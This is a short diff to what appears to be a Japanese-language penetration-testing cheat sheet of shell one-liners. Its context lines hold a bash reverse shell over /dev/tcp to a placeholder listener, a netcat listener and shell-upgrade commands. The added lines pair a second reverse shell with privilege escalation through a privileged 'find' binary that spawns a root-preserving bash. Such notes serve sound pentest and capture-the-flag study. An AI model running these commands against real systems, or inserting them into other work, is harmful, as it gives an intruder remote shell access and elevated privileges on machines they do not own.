@@ -2,6 +2,9 @@
 /bin/bash -c '/bin/bash -i >& /dev/tcp/<待ち受けIP>/<待ち受けポート> 0>&1'
 nc -lvnp <待ち受けポート>
 
+#Reverse Shell（特別な権限のあるファイル経由）
+/tmp/find /tmp/nc -exec /bin/bash -p -i >& /dev/tcp/<IP>/<port> 0>&1 \;
+
 #shellのアップグレード
 python3 -c "import pty;pty.spawn('/bin/bash')"
 script /dev/null -qc /bin/bash
